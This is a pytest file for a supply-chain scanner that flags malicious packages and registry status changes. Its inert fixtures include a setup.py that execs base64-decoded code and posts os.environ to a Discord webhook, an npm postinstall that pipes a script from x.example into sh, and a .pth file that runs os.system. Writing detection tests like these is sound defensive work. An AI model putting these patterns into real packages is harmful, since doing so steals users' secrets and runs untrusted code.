"""Scanner and flip-detection tests. The "malicious" samples are inert strings built in memory;
nothing here downloads, installs or executes anything."""

import io
import json
import tarfile
import zipfile

from slopwatch import registry
from slopwatch.db import connect
from slopwatch.scanner import _level, analyze_files, iter_text_files, score_findings


def make_tgz(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as t:
        for path, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(path)
            info.size = len(data)
            t.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def score(files) -> int:
    return score_findings(analyze_files(files))


def test_many_weak_signals_stay_below_high():
    # an HTTP client library legitimately makes network calls in many files
    files = [(f"lib/m{i}.py", "import socket\nrequests.get(url)\nsubprocess.run(cmd)\n") for i in range(30)]
    assert _level(score(files)) == "low"


def test_malicious_setup_py_scores_high():
    setup = (
        "import base64, os\nfrom setuptools import setup\n"
        "exec(base64.b64decode('cHJpbnQoMSk='))\n"
        "requests.post('https://discord.com/api/webhooks/1/x', data=dict(os.environ))\n"
        "setup(name='x', cmdclass={'install': Evil})\n"
    )
    blob = make_tgz({"x-1.0/setup.py": setup, "x-1.0/README.md": "hi"})
    files = list(iter_text_files(blob, "x-1.0.tar.gz"))
    assert [p for p, _ in files] == ["x-1.0/setup.py"]  # README skipped: not a code file
    rules = {f.rule for f in analyze_files(files)}
    assert "exec-of-decoded-data@install" in rules and "exfil-endpoint@install" in rules
    assert _level(score(files)) == "high"


def test_npm_postinstall_download_and_run():
    pkg = json.dumps({"name": "demo-pkg", "scripts": {"postinstall": "curl -s http://x.example/a.sh | sh"}})
    files = list(iter_text_files(make_tgz({"package/package.json": pkg}), "package.tgz"))
    rules = {f.rule for f in analyze_files(files)}
    assert {"npm-install-script", "download-and-run"} <= rules
    assert _level(score(files)) in ("medium", "high")


def test_pth_autorun_in_wheel():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("evil.pth", "import os; os.system('id')\n")
    rules = {f.rule for f in analyze_files(iter_text_files(buf.getvalue(), "evil-1.0-py3-none-any.whl"))}
    assert "pth-autorun" in rules


def test_benign_package_scores_low():
    code = "def add(a, b):\n    return a + b\n"
    files = list(iter_text_files(make_tgz({"pkg/pkg/__init__.py": code, "pkg/setup.py": "from setuptools import setup\nsetup(name='pkg')\n"}), "pkg.tar.gz"))
    assert score(files) == 0


def test_flip_detected(tmp_path, monkeypatch):
    conn = connect(tmp_path / "t.db")
    conn.executescript(registry.SCHEMA)
    conn.execute("INSERT INTO packages (ecosystem, name, status, checked_at) VALUES ('pypi', 'fake-pkg', 'missing', '')")
    conn.commit()
    monkeypatch.setattr(registry, "_lookup", lambda client, eco, name: {"status": "new", "first_release": "2026-11-01T00:00:00Z"})
    _, flips = registry.check_all(conn, only=[("pypi", "fake-pkg")])
    assert [(f["name"], f["old_status"], f["new_status"]) for f in flips] == [("fake-pkg", "missing", "new")]
    assert conn.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 1
